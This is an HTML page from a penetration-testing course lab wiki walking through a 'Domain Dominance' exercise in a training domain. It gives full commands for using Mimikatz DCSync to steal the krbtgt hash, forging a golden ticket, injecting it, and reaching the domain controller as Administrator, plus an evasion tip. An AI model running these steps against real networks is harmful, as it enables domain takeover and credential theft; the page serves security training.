@@ -1,0 +1,320 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-55-domain-dominance">Lab 5.5: Domain Dominance</h1>
+<h2 id="objectives">Objectives</h2>
+<ul>
+<li>We will extract the Kerberos keys for the <b>krbtgt</b> account</li>
+<li>We will create a golden ticket with the obtained key</li>
+<li>We will use the golden ticket to access the domain</li>
+</ul>
+<h2 id="lab-setup">Lab Setup</h2>
+<p>You&rsquo;ll need to have your Slingshot Windows image booted for this lab. From the Slingshot Windows image, we will access TRINTIY, which is a system joined to the sec560.local domain, for which we have obtained a valid set of domain credentials. From here, our goal is to obtain the Kerberos keys for the <b>krbtgt</b> account, which we can use to create a golden ticket.</p>
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<h4 id="1-start-by-opening-a-psexec-session-to-trinity-10101010-which-is-joined-to-the-sec560local-domain">1. Start by opening a PsExec session to TRINITY (10.10.10.10), which is joined to the sec560.local domain</h4>
+<p><b>PLEASE MAKE SURE YOU RUN THE FOLLOWING COMMANDS IN A WINDOWS COMMAND PROMPT:</b></p>
+<p>First, <code>cd</code> to the directory where our PsExec is located and list the directory contents using <code>dir pse*.exe</code> to find executables beginning with "pse":</p>
+<pre>
+C:\Users\sec560> <b>cd C:\Tools\SysinternalsSuite</b>
+C:\Tools\SysinternalsSuite> <b>dir pse*.exe</b>
+ Volume in drive C has no label.
+ Volume Serial Number is FA12-EC34
+
+ Directory of C:\Tools\SysinternalsSuite
+
+06/19/2019  10:08 PM           339,096 PsExec.exe
+06/19/2019  10:08 PM           374,944 PsExec64.exe
+               2 File(s)        714,040 bytes
+               0 Dir(s)  15,847,223,296 bytes free
+</pre>
+
+<p>In the directory, you will find the <code>PsExec64.exe</code> executable, which we will use to start a session toward TRINTITY (<code>10.10.10.10</code>). We will accept the PsExec EULA (using the <code>-accepteula</code> flag) and use the domain user we obtained in the Kerberos lab called "svcsqlserver" (using the <code>-u</code> flag):</p>
+<pre>
+C:\Tools\SysinternalsSuite> <b>PsExec64.exe -accepteula -u sec560.local\svcsqlserver \\10.10.10.10 cmd.exe</b>
+</pre>
+
+<p>You will be requested to enter the password <code>Jabbathehut23</code>, which you retrieved in the Kerberos lab.</p>
+<blockquote>
+<p>Note: The admin should lose his nerd card. He spelled Jabba's species wrong (Hutt) and confused it with the pizza place. The password has a single <code>t</code> in "hut".</p>
+</blockquote>
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img01.png" style="width:100%;max-width:600px"  alt="Use the password Jabbathehut23" /></p>
+<h4 id="2-browse-the-ctoolsmimikatzx64-directory">2. Browse the C:\Tools\Mimikatz\x64 directory</h4>
+<p>We have already prepared the Mimikatz toolkit for your use on the TRINTIY machine. It's available in <code>C:\Tools\Mimikatz\x64</code>; switch to the folder using <code>cd</code> and view its contents using <code>dir</code>:</p>
+<pre>
+C:\Windows\system32> <b>cd C:\Tools\Mimikatz\x64</b>
+C:\Tools\Mimikatz\x64> <b>dir</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img02.png" style="width:100%;max-width:600px"  alt="Mimikatz is already on TRINITY" /></p>
+<h4 id="3-we-will-now-use-mimikatz-to-extract-the-kerberos-keys-from-the-domain-controller">3. We will now use Mimikatz to extract the Kerberos keys from the domain controller</h4>
+<p>We will use the <code>dcsyn</code> command within Mimikatz to connect to the domain controller and extract the Kerberos keys for the <b>krbtgt</b> user:</p>
+<pre>
+C:\Tools\Mimikatz\x64> <b>mimikatz.exe</b>
+
+mimikatz # <b>lsadump::dcsync /user:krbtgt</b>
+</pre>
+
+<p>The output should reveal information for the <b>krbtgt</b> account, such as the SAM information and hashed credentials. As explained during the course, this will also include the RC4 and AES Kerberos keys.</p>
+<p>For this exercise, we will use the NT hash (which is the RC4 key) of the <b>krbtgt</b> account. Copy the hash you find next to <code>Hash NTLM:</code> to your clipboard.</p>
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img03.png" style="width:100%;max-width:600px"  alt="Copy the hash listed next to NTLM" /></p>
+<h4 id="4-retrieve-domain-information-to-create-the-golden-ticket">4. Retrieve domain information to create the golden ticket</h4>
+<p>Before we can create the golden ticket, we would need to get a bit more information on the domain. First, we need to know the fully qualified domain name. In order to find this, we need to exit our Mimikatz session. This can be done by entering the <code>exit</code> command.</p>
+<pre>
+mimikatz # <b>exit</b>
+</pre>
+
+<p>We can find the fully qualified domain name by retrieving the IP configuration:</p>
+<pre>
+C:\Tools\Mimikatz\x64> <b>ipconfig /all</b>
+</pre>
+
+<p>If we scroll to the beginning of the output, we can see the Primary DNS Suffix being <code>sec560.local</code>. This is the fully qualified domain name we need.</p>
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img04.png" style="width:100%;max-width:600px"  alt="The Primary DNS Suffix is the FQDN we will be using" /></p>
+<p>We will also need the domain SID. We can find this by using the <code>whoami /user</code> command:</p>
+<pre>
+C:\Tools\Mimikatz\x64> <b>whoami /user</b>
+</pre>
+
+<p>The domain SID starts with <code>S-1-5</code>and ends with <code>2889670365</code> (see highlighted section in screenshot).</p>
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img05.png" style="width:100%;max-width:600px"  alt="Find the domain SID with the whoami command" /></p>
+<h4 id="5-create-a-golden-ticket">5. Create a golden ticket</h4>
+<p>With the above information, we can now create our golden ticket. Please launch Mimikatz again and use the following command to create our golden ticket:</p>
+<pre>
+C:\Tools\Mimikatz\x64> <b>mimikatz.exe</b>
+
+mimikatz # <b>kerberos::golden /rc4:5525e655c06299c7e4179e2cc5621fb3 /user:Administrator /domain:sec560.local /sid:S-1-5-21-721047592-4068106649-2889670365</b>
+</pre>
+
+<p>Some notes on the arguments for this command:</p>
+<ul>
+<li><code>/rc4</code>: We will use RC4 encryption using the NT hash we previously stole (<code>5525e655c06299c7e4179e2cc5621fb3</code>) as a key</li>
+<li><code>/user</code>: The target username is <code>Administrator</code></li>
+<li><code>/domain</code>: the target domain name is <code>sec560.local</code></li>
+<li><code>/sid</code>: The target domain SID (Security Identifier)</li>
+</ul>
+<p>Please carefully observe the output of the command, and you will notice the interesting properties of the ticket:</p>
+<ul>
+<li>It is valid for a period of <b>10 years</b></li>
+<li>The <b>ServiceKey</b> that is used is the <b>krbtgt</b> RC4 key (NT hash)</li>
+</ul>
+<p>A small note on evasion: If we want to make our attack more stealthy, we would choose to steal the AES keys of the <b>krbtgt</b> account and generate a golden ticket using AES instead of RC4. In a typical environment, AES is the dominant Kerberos encryption type in use and using RC4 is an anomaly in and of itself that would warrant further investigation.</p>
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img06.png" style="width:100%;max-width:600px"  alt="Generate a Golden Ticket that lasts for 10 years using Mimikatz (Charlie would be proud!)" /></p>
+<h4 id="6-abuse-the-golden-ticket">6. Abuse the golden ticket</h4>
+<p>The above command created a golden ticket and saved it locally. Please close the command prompt you were using up until this point. We will open a Windows File Explorer window to the TRINITY machine at 10.10.10.10 by entering the following network location:</p>
+<pre>
+\\10.10.10.10\c$\tools\Mimikatz\x64
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img07.png" style="width:100%;max-width:600px"  alt="Connect to TRINITY through Windows File Explorer" /></p>
+<p>Please copy the <code>ticket.kirbi</code> file and paste it to your Desktop.</p>
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img08.png" style="width:100%;max-width:600px"  alt="Copy this Golden Ticket to your Desktop" /></p>
+<p>You can close the Windows File Explorer window afterwards. Open an elevated (Administrator) command prompt, <code>cd</code> to C:\Tools\Mimikatz\x64, and launch Mimikatz.</p>
+<pre>
+C:\Windows\system32> <b>cd C:\Tools\Mimikatz\x64</b>
+C:\Tools\Mimikatz\x64\> <b> mimikatz.exe </b>
+</pre>
+
+<p>We will now inject the golden ticket into memory using the <code>kerberos::ptt</code>command.</p>
+<pre>
+mimikatz # <b>kerberos::ptt C:\Users\sec560\Desktop\ticket.kirbi</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img09.png" style="width:100%;max-width:600px"  alt="Inject the Golden Ticket into memory using Mimikatz" /></p>
+<p>If injected correctly, the output should show <code>* File: 'C:\Users\sec560\Desktop\ticket.kirbi': OK</code></p>
+<p>We can close Mimikatz by entering the <code>exit</code>command.</p>
+<p>To verify the ticket is loaded in memory, we can use the <code>klist</code>command:</p>
+<pre>
+mimikatz # <b>exit</b>
+C:\Tools\Mimikatz\x64\> <b>klist</b>
+</pre>
+
+<p>This will show all cached tickets currently stored in memory.</p>
+<p><img  class="myImg"  src="pics/Ex5.5_E01_01_img10.png" style="width:100%;max-width:600px"  alt="klist shows our injected Golden Ticket" /></p>
+<p>In a real-life situation, we can use this ticket to access the domain with administrative privileges.</p>
+<p>Since our Slingshot Windows machine is not domain joined AND you are all attacking the same domain, we won't use this ticket to access the domain controller (as you'll be fighting for control).</p>
+<p>In a real-life penetration test, you would continue using the ticket to access the domain controller. We have explained the required steps below, but please do <strong>NOT</strong> execute these on our test environment:</p>
+<p>When the ticket is loaded in memory, we can open a command prompt and use PsExec to access the domain controller:</p>
+<pre>
+C:\Tools\SysinternalsSuite><b> PsExec64.exe -accepteula \\dc01 cmd.exe</b>
+</pre>
+
+<p>This command will open a remote command prompt on the domain controller. The connection might take up to a minute. Once you receive the new prompt, please execute the following command:</p>
+<pre>
+C:\Windows\system32> <b>whoami</b>
+</pre>
+
+<p>The output should be:</p>
+<pre>
+C:\Windows\system32> <b>whoami</b>
+sec560.local\Administrator
+</pre>
+
+<p>This confirms you are now running with Domain Administrator privileges!</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In this lab, we looked at how we can use a domain user with administrative privileges to obtain the Kerberos keys from the <b>krbtgt</b> user. This information, together with the easily retrievable domain information, such as the fully qualified domain name and domain SID, allowed us to create a golden ticket and use this ticket to access the domain with administrative privileges.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
